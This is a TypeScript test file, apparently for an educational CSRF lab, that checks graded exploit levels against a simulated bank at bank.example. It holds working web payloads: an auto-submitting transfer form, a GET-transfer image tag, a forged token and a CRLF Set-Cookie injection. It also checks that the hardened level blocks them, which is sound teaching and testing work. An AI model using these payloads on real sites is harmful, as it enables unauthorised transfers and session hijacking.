import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { csrfRealLab } from "./labs/csrf.js";
import type { LabInput, RealLab } from "./labs/runner.js";

type Exploits = Record<1 | 2 | 3 | 4, LabInput>;

/** Same checks as scripts/test-labs.ts (and server/src/labs.test.ts), against the real engine. */
function levelDesign(lab: RealLab, exploits: Exploits, benign: LabInput): void {
  describe(`${lab.id} (real)`, () => {
    for (const lv of [1, 2, 3, 4] as const) {
      it(`Lv${lv} is solved by its exploit`, async () => {
        assert.equal((await lab.run(lv, exploits[lv])).solved, true);
      });
      if (lv > 1) {
        const prev = (lv - 1) as 1 | 2 | 3;
        it(`Lv${lv} blocks the Lv${prev} exploit`, async () => {
          assert.equal((await lab.run(lv, exploits[prev])).solved, false);
        });
      }
      it(`Lv5 resists the Lv${lv} exploit`, async () => {
        assert.equal((await lab.run(5, exploits[lv])).solved, false);
      });
    }
    for (const lv of [1, 2, 3, 4, 5] as const) {
      it(`Lv${lv} benign input does not solve`, async () => {
        assert.equal((await lab.run(lv, benign)).solved, false);
      });
    }
  });
}

// Same shape as the front end's src/labs/csrf.ts exploits (ATTACKER_CSRF_TOKEN
// is the fixed "csrf-issued-attacker" demo constant taught by the Lv3/Lv4
// hints; see server/src/labs/csrf.ts for why Lv1-4 keep it instead of a
// per-process random value).
const ATTACKER_CSRF_TOKEN = "csrf-issued-attacker";
const EXPLOIT_FORM = (extraFields: string) =>
  `<form action="https://bank.example/transfer" method="post">${extraFields}<input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>`;
const CRLF_IMG = '<img src="https://bank.example/set-lang?l=en%0d%0aSet-Cookie:%20session=s-attacker">';

levelDesign(
  csrfRealLab,
  {
    1: { html: '<img src="https://bank.example/transfer?to=attacker&amount=10000">' },
    2: { html: EXPLOIT_FORM("") },
    3: { html: EXPLOIT_FORM(`<input name="csrf_token" value="${ATTACKER_CSRF_TOKEN}">`) },
    4: { html: CRLF_IMG + EXPLOIT_FORM(`<input name="csrf_token" value="${ATTACKER_CSRF_TOKEN}">`) },
  },
  { html: "<h1>かわいい子猫の写真</h1>" },
);

describe("csrf (real HTTP behaviour)", () => {
  it("the bank itself rejects a GET transfer at Lv2+ (real server response, not a client heuristic)", async () => {
    const r = await csrfRealLab.run(2, { html: '<img src="https://bank.example/transfer?to=attacker&amount=10000">' });
    assert.equal(r.solved, false);
    assert.match(r.output.join("\n"), /POST 必須/);
  });

  it("Lv4 CRLF injection really smuggles a second Set-Cookie header over the wire", async () => {
    const r = await csrfRealLab.run(4, {
      html: CRLF_IMG + EXPLOIT_FORM(`<input name="csrf_token" value="${ATTACKER_CSRF_TOKEN}">`),
    });
    assert.equal(r.solved, true);
    assert.match(r.output.join("\n"), /注入された Cookie/);
  });

  it("Lv5 rejects the same CRLF payload at the header-validation layer (Node's real ERR_INVALID_CHAR)", async () => {
    const r = await csrfRealLab.run(5, {
      html: CRLF_IMG + EXPLOIT_FORM(`<input name="csrf_token" value="${ATTACKER_CSRF_TOKEN}">`),
    });
    assert.equal(r.solved, false);
    assert.doesNotMatch(r.output.join("\n"), /注入された Cookie/);
  });

  it("Lv5's token is a real per-session HMAC, not the well-known demo constant", async () => {
    const r = await csrfRealLab.run(5, {
      html: EXPLOIT_FORM(`<input name="csrf_token" value="${ATTACKER_CSRF_TOKEN}">`),
    });
    assert.equal(r.solved, false);
  });

  it("a legitimate same-site transfer (no attacker page involved) still succeeds", async () => {
    // Sanity check: the defenses only block cross-site forgeries, not normal use.
    const r = await csrfRealLab.run(1, { html: '<img src="https://bank.example/transfer?to=bob&amount=500">' });
    assert.equal(r.solved, true);
    assert.match(r.output.join("\n"), /bob へ 500 円を送金しました/);
  });
});
